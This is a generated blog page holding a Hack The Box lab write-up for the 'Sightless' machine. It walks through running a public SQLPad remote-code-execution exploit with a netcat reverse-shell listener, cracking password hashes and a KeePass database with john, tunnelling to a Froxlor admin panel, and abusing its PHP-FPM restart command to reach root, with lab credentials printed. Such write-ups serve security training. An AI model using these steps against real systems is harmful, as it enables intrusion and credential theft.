@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="First we&rsquo;re going to do a scan on the Internet to see what ports are open.
+Then I started adding the domainname to the /etc/hosts file. This allowed us to go on the web browser to the web page http://sightless.htb
+On this web page, we see 2 different things that might be of interest.
+At the first picture we can find the about button in the upper right corner this will say on which version sqlpad is hosted.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox-documentations/writeup-sightless/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="First we’re going to do a scan on the Internet to see what ports are open.
+Then I started adding the domainname to the /etc/hosts file. This allowed us to go on the web browser to the web page http://sightless.htb
+On this web page, we see 2 different things that might be of interest.
+At the first picture we can find the about button in the upper right corner this will say on which version sqlpad is hosted.">
+  <meta itemprop="wordCount" content="993">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="First we’re going to do a scan on the Internet to see what ports are open.
+Then I started adding the domainname to the /etc/hosts file. This allowed us to go on the web browser to the web page http://sightless.htb
+On this web page, we see 2 different things that might be of interest.
+At the first picture we can find the about button in the upper right corner this will say on which version sqlpad is hosted.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox-documentations/writeup-sightless/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>First we&rsquo;re going to do a scan on the Internet to see what ports are open.</p>
+<p><img src="73859193.png" alt="image-20241230-202410.png"></p>
+<p>Then I started adding the domainname to the /etc/hosts file. This allowed us to go on the web browser to the web page <a href="http://sightless.htb">http://sightless.htb</a></p>
+<p><img src="74416228.png" alt="image-20241230-202446.png"></p>
+<p>On this web page, we see 2 different things that might be of interest.</p>
+<p><img src="73891974.png" alt="image-20241230-202146.png"></p>
+<p>At the first picture we can find the about button in the upper right corner this will say on which version sqlpad is hosted.</p>
+<p><img src="73891968.png" alt="image-20241230-202122.png"></p>
+<p>Then I started looking for an exploit for the version of sqlpad.</p>
+<p><a href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944">https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944</a></p>
+<p>By using the following command we can start contacting the root user of the sqlpad.</p>
+<p>On the first shell we are going to put the following commado:</p>
+<pre tabindex="0"><code>python3 exploit.py http://sqlpad.sightless.htb 10.10.14.39 4444
+</code></pre><p>On a second shell we are going to set the listener. We will do this using the following command:</p>
+<pre tabindex="0"><code>nc -lvp 4444
+</code></pre><p><img src="74416236.png" alt="image-20241230-202719.png"></p>
+<p>If we take a look at the shadow file, we can see that some passwords have been hashed. We will retrieve them using john or hashcat. To do this we need to store the hashes in a separate file on our normal machine and then we can use the following command to retrieve the passwords.</p>
+<pre tabindex="0"><code>john --wordlist=/usr/share/wordlists/rockyou.txt &lt;file waar de hashes in staan&gt;
+</code></pre><p>There you can see that the user michael has the following password.</p>
+<p><img src="73891985.png" alt="image-20241230-203151.png"></p>
+<p>We can now start making an ssh connection using the following user credentials:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Password</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Michael</td>
+          <td>insaneclownposse</td>
+      </tr>
+  </tbody>
+</table>
+<p>If we are going to use the ls command in the ssh connection, we are going to see our first flag. We&rsquo;re going to be able to see it by using the cat command.</p>
+<p>Here we have the first flag.</p>
+<p>![[Pasted image 20250122142508.png]]</p>
+<p>If we will look at the /etc/hosts file in this user, we will see that the there is an ip address “127.0.0.1”. By using linpeas I have seen that the port 8080 is used to host the admin login page of froxlor</p>
+<p><img src="74416243.png" alt="image-20241230-203233.png"></p>
+<p>So we are going to log out on the ssh connection and start a new connection where &hellip;. . We will start doing this using the following command:</p>
+<pre tabindex="0"><code>ssh michael@sightless.htb -L 127.0.0.1:8080:127.0.0.1:8080 
+</code></pre><p><img src="72646728.png" alt="image-20241230-203304.png"></p>
+<p>So if we will check after on our web browser and we will look for that ip address, you will see that we will see the admin login page from froxlor.</p>
+<p><img src="73891895.png" alt="image-20241230-193459.png"></p>
+<p>To find the login credentials we will have to start using the debugger. There we can see that we are shown the following credentials:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Password</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>admin</td>
+          <td>ForlorforxAdmin</td>
+      </tr>
+  </tbody>
+</table>
+<p>From here we can give certain commands. For example, we can say that since we are logged in as administrator, we copy the root.txt file to the tmp folder of the user michael. The same for the id_rsa file. We will need this to see the root.txt file or to log in as user root via an ssh connection.</p>
+<p>How do we tell him to copy the root.txt file to the user michael?</p>
+<p>We will do this by navigating in the admin login page to the PHP in the sidebar and selecting PHP-FPM versions.</p>
+<p><img src="72646702.png" alt="image-20241230-194249.png"></p>
+<p>then we get the following.</p>
+<p><img src="74416189.png" alt="image-20241230-194411.png"></p>
+<p>If we click there on the right hand side we can start to modify the configuration. Then you can go there at the php-fpm restart command to include the command.</p>
+<p><img src="73891903.png" alt="image-20241230-194334.png"></p>
+<p>Before the command comes through to the user michael we will have to push it through by doing the following.</p>
+<p>Go to System → Settings → PHP-FPM</p>
+<p><img src="73859162.png" alt="image-20241230-195056.png"></p>
+<p>There we will have to go the Enable php-fpm turn this off for a few seconds, then turn it back on and click save.</p>
+<p><img src="74416199.png" alt="image-20241230-195209.png"></p>
+<p>Should this option not work for the rsa: For example you can see the rsa within the user michael but you cannot open the file because you do not have permissions then you can also do it the following way.</p>
+<p>Go to Resources → Customers and you will see the user john there.</p>
+<p><img src="74416206.png" alt="image-20241230-195433.png"></p>
+<p>You can go there and change the user&rsquo;s password. I used the following credentials:</p>
+<p>These will be the credentials for ftp server:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Password</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>web1</td>
+          <td>Password1</td>
+      </tr>
+  </tbody>
+</table>
+<p>Using this data, we are going to run the following command:</p>
+<pre tabindex="0"><code>lftp -u web1 sightless.htb 
+Password: Password1
+</code></pre><p><img src="73891914.png" alt="image-20241230-195742.png"></p>
+<p>We will first have to disable the ssl cert otherwise this will cause problems and it will say that the certificate is not correct. We will do this using the following command:</p>
+<pre tabindex="0"><code>set ssl:verify-certificate off
+</code></pre><p>Then we can start looking through the directories and we will eventually see a file Database.kdb. We will start downloading this to our own machine so we can start converting it to a hash and then finally crack it with john.</p>
+<p><img src="73891923.png" alt="image-20241230-200209.png"></p>
+<p>We are going to do this using the following commands (This is after downloading and thus happens on our own machine)</p>
+<pre tabindex="0"><code>keepass2john Database.kdb &gt; hash &lt;dit is een naamgeving dat we geven, zodat we het password kunnen gaan cracken&gt;
+</code></pre><pre tabindex="0"><code>john --wordlist=/usr/share/wordlists/rockyou.txt &lt;file waar de hashes in staan&gt;
+</code></pre><p><img src="73859174.png" alt="image-20241230-200516.png"><img src="73891933.png" alt="image-20241230-200547.png"></p>
+<p>This is the password we will be using to log into the database. We will be using KeePass for this purpose. We will first have to start downloading this on our machines. We will do this using the following command:</p>
+<pre tabindex="0"><code>sudo apt-get install keepassxc
+</code></pre><p>1 once installed we can start opening keepass using the following command.</p>
+<pre tabindex="0"><code>keepassxc Database.kdb
+</code></pre><p>Thenm we have to enter the password and we get to this page.</p>
+<p><img src="73859180.png" alt="image-20241230-200906.png"></p>
+<p>Here we can see an id_rsa. We will go open this and we can go save it on michael&rsquo;s ssh connection. we will do this using the following command:</p>
+<pre tabindex="0"><code>nano id_rsa_test
+</code></pre><p><img src="73891940.png" alt="image-20241230-201113.png"><img src="72646714.png" alt="image-20241230-201217.png"></p>
+<p>Using this id_rsa_test file we can start connecting to the root user. We will do this using the following command:</p>
+<pre tabindex="0"><code>ssh -i id_rsa_test root@10.129.83.162
+</code></pre><p>First I got the following error message</p>
+<p><img src="73891947.png" alt="image-20241230-201421.png"></p>
+<p>I solved this by executing the command</p>
+<pre tabindex="0"><code>chmod 600 id_rsa_test
+</code></pre><p>if we will now try to make the connection you will see that you can now connect to the root user.</p>
+<p><img src="73891955.png" alt="image-20241230-201602.png"></p>
+<p>So now we have the 2nd flag and so we did this machine completely.</p>
+<p>![[Pasted image 20250122142731.png]]</p>
+<p><img src="72646735.png" alt="image-20241230-203532.png"></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
